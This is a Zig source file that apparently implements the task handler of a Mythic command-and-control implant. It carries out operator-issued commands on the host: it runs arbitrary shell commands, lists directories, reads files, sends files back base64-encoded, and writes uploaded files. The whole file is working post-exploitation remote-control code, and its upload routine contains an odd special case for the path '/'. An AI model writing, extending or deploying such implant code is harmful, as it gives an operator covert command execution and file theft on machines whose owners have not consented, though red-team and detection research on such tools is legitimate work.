const std = @import("std");
const builtin = @import("builtin");
const types = @import("types.zig");
const json = std.json;
const base64 = std.base64;
const Allocator = std.mem.Allocator;
const ArrayList = std.ArrayList;

const MythicTask = types.MythicTask;
const MythicResponse = types.MythicResponse;

pub const CommandExecutor = struct {
    allocator: Allocator,

    pub fn init(allocator: Allocator) CommandExecutor {
        return CommandExecutor{
            .allocator = allocator,
        };
    }

    pub fn executeTask(self: *CommandExecutor, task: MythicTask) !MythicResponse {
        if (std.mem.eql(u8, task.command, "shell")) {
            return try self.executeShell(task);
        } else if (std.mem.eql(u8, task.command, "pwd")) {
            return try self.executePwd(task);
        } else if (std.mem.eql(u8, task.command, "ls")) {
            return try self.executeLs(task);
        } else if (std.mem.eql(u8, task.command, "cat")) {
            return try self.executeCat(task);
        } else if (std.mem.eql(u8, task.command, "download")) {
            return try self.executeDownload(task);
        } else if (std.mem.eql(u8, task.command, "upload")) {
            return try self.executeUpload(task);
        } else {
            return MythicResponse{
                .task_id = task.id,
                .user_output = try std.fmt.allocPrint(self.allocator, "{s}", .{task.command}),
                .completed = true,
                .status = "error",
            };
        }
    }

    fn executeShell(self: *CommandExecutor, task: MythicTask) !MythicResponse {
        const ShellParameters = struct {
            command: []const u8,
        };
        const parsed = try json.parseFromSlice(ShellParameters, self.allocator, task.parameters, .{});
        defer parsed.deinit();
        const command = parsed.value.command;
        if (command.len == 0) {
            return MythicResponse{
                .task_id = task.id,
                .user_output = "No command provided",
                .completed = true,
                .status = "error",
            };
        }
        const shell_path = if (builtin.os.tag == .windows) "cmd.exe" else "/bin/sh";
        const shell_args = if (builtin.os.tag == .windows) "/c" else "-c";
        const result = std.process.Child.run(.{
            .allocator = self.allocator,
            .argv = &[_][]const u8{ shell_path, shell_args, command },
        }) catch |err| {
            return MythicResponse{
                .task_id = task.id,
                .user_output = try std.fmt.allocPrint(self.allocator, "{}", .{err}),
                .completed = true,
                .status = "error",
            };
        };

        defer self.allocator.free(result.stdout);
        defer self.allocator.free(result.stderr);

        const output = if (result.stdout.len > 0) result.stdout else result.stderr;

        return MythicResponse{
            .task_id = task.id,
            .user_output = try self.allocator.dupe(u8, output),
            .completed = true,
            .status = "completed",
        };
    }

    fn executePwd(self: *CommandExecutor, task: MythicTask) !MythicResponse {
        const cwd = std.process.getCwdAlloc(self.allocator) catch |err| {
            return MythicResponse{
                .task_id = task.id,
                .user_output = try std.fmt.allocPrint(self.allocator, "{}", .{err}),
                .completed = true,
                .status = "error",
            };
        };

        return MythicResponse{
            .task_id = task.id,
            .user_output = cwd,
            .completed = true,
            .status = "completed",
        };
    }

    fn executeLs(self: *CommandExecutor, task: MythicTask) !MythicResponse {
        const Parameters = struct {
            path: []const u8 = ".",
        };

        const parsed = try json.parseFromSlice(Parameters, self.allocator, task.parameters, .{});
        defer parsed.deinit();

        const path = parsed.value.path;

        var dir = std.fs.cwd().openDir(path, .{ .iterate = true }) catch |err| {
            return MythicResponse{
                .task_id = task.id,
                .user_output = try std.fmt.allocPrint(self.allocator, "{s}: {}", .{ path, err }),
                .completed = true,
                .status = "error",
            };
        };
        defer dir.close();

        var output = ArrayList(u8){};
        defer output.deinit(self.allocator);

        var iterator = dir.iterate();
        while (try iterator.next()) |entry| {
            try output.appendSlice(self.allocator, entry.name);
            try output.append(self.allocator, '\n');
        }

        return MythicResponse{
            .task_id = task.id,
            .user_output = try output.toOwnedSlice(self.allocator),
            .completed = true,
            .status = "completed",
        };
    }

    fn executeCat(self: *CommandExecutor, task: MythicTask) !MythicResponse {
        if (task.parameters.len == 0) {
            return MythicResponse{
                .task_id = task.id,
                .user_output = "No filename provided",
                .completed = true,
                .status = "error",
            };
        }

        const content = std.fs.cwd().readFileAlloc(self.allocator, task.parameters, 1024 * 1024) catch |err| {
            return MythicResponse{
                .task_id = task.id,
                .user_output = try std.fmt.allocPrint(self.allocator, "{s}: {}", .{ task.parameters, err }),
                .completed = true,
                .status = "error",
            };
        };

        return MythicResponse{
            .task_id = task.id,
            .user_output = content,
            .completed = true,
            .status = "completed",
        };
    }

    fn executeDownload(self: *CommandExecutor, task: MythicTask) !MythicResponse {
        const file_content = std.fs.cwd().readFileAlloc(self.allocator, task.parameters, 10 * 1024 * 1024) catch |err| {
            return MythicResponse{
                .task_id = task.id,
                .user_output = try std.fmt.allocPrint(self.allocator, "{}", .{err}),
                .completed = true,
                .status = "error",
            };
        };
        defer self.allocator.free(file_content);

        const encoder = base64.standard.Encoder;
        const encoded_size = encoder.calcSize(file_content.len);
        const encoded_content = try self.allocator.alloc(u8, encoded_size);
        _ = encoder.encode(encoded_content, file_content);

        return MythicResponse{
            .task_id = task.id,
            .download = types.DownloadInfo{
                .chunk_num = 1,
                .chunk_data = encoded_content,
                .total_chunks = 1,
                .full_path = null,
                .chunk_size = encoded_content.len,
                .is_screenshot = false,
            },
            .user_output = try std.fmt.allocPrint(self.allocator, "{s} ({d} bytes)", .{ task.parameters, file_content.len }),
            .completed = true,
            .status = "completed",
        };
    }

    fn executeUpload(self: *CommandExecutor, task: MythicTask) !MythicResponse {
        const parsed = json.parseFromSlice(json.Value, self.allocator, task.parameters, .{}) catch {
            return MythicResponse{
                .task_id = task.id,
                .user_output = "Invalid upload parameters",
                .completed = true,
                .status = "error",
            };
        };
        defer parsed.deinit();

        const remote_path = parsed.value.object.get("remote_path").?.string;
        const b64_content = parsed.value.object.get("content").?.string;
        const decoded_len = base64.standard.Decoder.calcSizeForSlice(b64_content) catch {
            std.debug.print("", .{});
            return error.InvalidBase64;
        };
        const decoded_content = try self.allocator.alloc(u8, decoded_len);
        defer self.allocator.free(decoded_content);
        base64.standard.Decoder.decode(decoded_content, b64_content) catch {
            std.debug.print("", .{});
            return error.InvalidBase64;
        };

        if (std.mem.eql(u8, remote_path, "/")) {
            const file = try std.fs.createFileAbsolute(remote_path, .{});
            defer file.close();
            if (std.mem.startsWith(u8, decoded_content, "b'") and std.mem.endsWith(u8, decoded_content, "'")) {
                // Remove the b'' prefix if present. Very hacky and hould be improved. Sould write an unescape function later.
                const content = decoded_content[2 .. decoded_content.len - 1];
                try file.writeAll(content);
            } else {
                try file.writeAll(decoded_content);
            }
        } else {
            std.fs.cwd().writeFile(.{ .sub_path = remote_path, .data = decoded_content }) catch |err| {
                return MythicResponse{
                    .task_id = task.id,
                    .user_output = try std.fmt.allocPrint(self.allocator, "Failed to write file: {}", .{err}),
                    .completed = true,
                    .status = "error",
                };
            };
        }
        return MythicResponse{
            .task_id = task.id,
            .user_output = try std.fmt.allocPrint(self.allocator, "{s} ({d} bytes)", .{ remote_path, b64_content.len }),
            .completed = true,
            .status = "completed",
        };
    }
};
